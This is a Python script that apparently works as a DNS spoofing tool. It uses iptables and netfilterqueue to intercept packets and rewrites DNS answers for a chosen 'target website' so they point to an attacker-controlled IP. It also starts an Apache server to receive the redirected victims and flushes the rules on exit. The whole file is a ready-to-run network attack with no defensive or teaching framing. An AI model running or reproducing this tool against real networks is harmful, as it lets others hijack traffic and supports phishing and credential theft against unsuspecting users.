#!usr/bin/env/python
import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse
import socket


def argument():
    par = argparse.ArgumentParser()
    par.add_argument("-w", "--target", dest="target_URL", help="Target website")
    par.add_argument("-m", "--MY_IP", dest="my_ip", action="store_true", help="IF you want to use your IP to be a server")
    par.add_argument("-t", "--TARGET_IP", dest="target_IP", help="An active server's IP")
    options = par.parse_args()
    if not options.target_URL:
        par.error("[-] Specify a target website")
    if options.my_ip and options.target_IP:
        par.error("[-] Two servers cannot be given simultaneously")
        exit()
    elif not options.my_ip and not options.target_IP:
        par.error("[-] Enter a Server you wants to redirect victim website to")
        exit()
    return options


def my_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def queue_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        print(URL)
        print(qname)
        if URL in qname:
            subprocess.call("service apache2 start", shell=True)
            print("[+] Spoofing data")
            answer = scapy.DNSRR(rrname=qname, rdata=desired_IP)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet).encode())
    packet.accept()


try:
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    options = argument()
    URL = options.target_URL.encode()
    if options.my_ip:
        desired_IP = my_ip_address()
    elif options.target_IP:
        desired_IP = options.target_IP
    print(desired_IP)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, queue_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    subprocess.call("service apache2 stop", shell=True)